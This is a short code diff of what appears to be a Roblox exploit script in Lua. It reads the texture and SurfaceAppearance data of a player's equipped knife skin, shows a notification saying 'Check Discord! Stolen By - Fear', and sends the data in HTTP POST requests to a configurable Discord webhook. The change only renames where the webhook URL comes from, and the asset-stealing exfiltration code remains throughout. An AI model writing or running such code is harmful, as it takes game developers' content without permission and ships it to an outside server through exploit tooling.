@@ -6,7 +6,6 @@ local function FindKnife()
         local Weapon = Player.Character[Tool.Name]
         local Equipped = game:GetService('HttpService'):JSONDecode(Player.DataFolder.Information.EquipSkins.Value)
         local Skin = Equipped[Weapon.Name]
-        local WebHook = Webhook
         if Equipped[Weapon.Name] then
             local Skin = Equipped[Weapon.Name]
             game:GetService("StarterGui"):SetCore("SendNotification",{
@@ -36,7 +35,7 @@ local function FindKnife()
 	            Title = "SurfaceAppearance got",
 	            Text = "Check Discord! Stolen By - Fear",
             })
-            local response = request({ Url = Webhook,
+            local response = request({ Url = Options.Webhook,
                 Method = 'POST',
                 Headers = {
                     ['Content-Type'] = 'application/json' 
@@ -56,7 +55,7 @@ local function FindKnife()
 	            Title = "TextureID got",
 	            Text = "Check Discord! Stolen By - Fear",
             })
-            local response = request({ Url = Webhook,
+            local response = request({ Url = Options.Webhook,
                 Method = 'POST',
                 Headers = {
                     ['Content-Type'] = 'application/json' 
